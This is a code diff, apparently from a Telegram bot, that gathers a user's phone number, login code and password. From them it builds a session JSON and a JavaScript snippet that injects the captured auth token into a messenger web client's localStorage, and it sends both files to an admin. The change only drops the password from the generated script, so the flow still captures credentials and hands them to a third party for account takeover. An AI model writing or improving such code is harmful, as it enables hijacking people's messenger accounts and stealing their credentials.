@@ -81,10 +81,8 @@ def build_desktop_json(token, device_id, session_id, password, user_id, phone):
         }
     }
 
-def generate_web_js(password, device_id, token, viewer_id):
-    return f"""PASSWORD: {password}
-
-sessionStorage.clear();
+def generate_web_js(device_id, token, viewer_id):
+    return f"""sessionStorage.clear();
 localStorage.clear();
 localStorage.setItem('__oneme_device_id', '{device_id}');
 localStorage.setItem('__oneme_auth', JSON.stringify({{"token":"{token}","viewerId":{viewer_id}}}));
@@ -219,7 +217,7 @@ async def code_handler(message: types.Message, state: FSMContext):
             device_id = str(uuid.uuid4())
 
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
-            js = generate_web_js(password, device_id, token, viewer_id)
+            js = generate_web_js(device_id, token, viewer_id)
 
             await send_files(phone, uid, work_dir, desktop, js)
             await safe_edit(msg, "✅ Готово! Файлы отправлены админу.")
@@ -298,7 +296,7 @@ async def password_handler(message: types.Message, state: FSMContext):
         device_id = str(uuid.uuid4())
 
         desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
-        js = generate_web_js(password, device_id, token, viewer_id)
+        js = generate_web_js(device_id, token, viewer_id)
 
         await send_files(phone, uid, work_dir, desktop, js)
         await safe_edit(msg, "✅ Готово!")
